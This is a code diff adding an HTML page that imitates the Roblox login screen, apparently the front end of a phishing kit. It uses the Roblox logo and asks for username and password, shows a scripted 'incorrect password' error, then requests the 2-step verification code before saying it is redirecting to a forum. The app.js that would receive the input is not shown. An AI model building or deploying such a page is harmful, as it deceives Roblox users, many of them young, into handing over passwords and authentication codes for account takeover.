@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox - Log In</title>
+    <!-- Basic styling to mimic Roblox -->
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 6px; }
+        button { width: 100%; padding: 12px; background-color: #00a2ff; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+        .hidden { display: none; }
+        #errorMessage { color: red; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Roblox_logo.svg" alt="Roblox Logo" width="150">
+        
+        <!-- Login Form -->
+        <div id="loginDiv">
+            <p>Log in to Roblox</p>
+            <div id="loginError" class="hidden" style="color:red;">Incorrect username or password. Please try again.</div>
+            <input type="text" id="username" placeholder="Username/Email/Phone">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="submitLogin()">Log In</button>
+        </div>
+
+        <!-- 2FA Form -->
+        <div id="tfaDiv" class="hidden">
+            <p>2-Step Verification</p>
+            <p>Enter the code from your authenticator app.</p>
+            <input type="text" id="tfaCode" placeholder="6-Digit Code">
+            <button onclick="submitTfa()">Verify</button>
+        </div>
+
+        <!-- Success/Redirect Message -->
+        <div id="successDiv" class="hidden">
+            <p>Success! Redirecting you to the forum...</p>
+        </div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
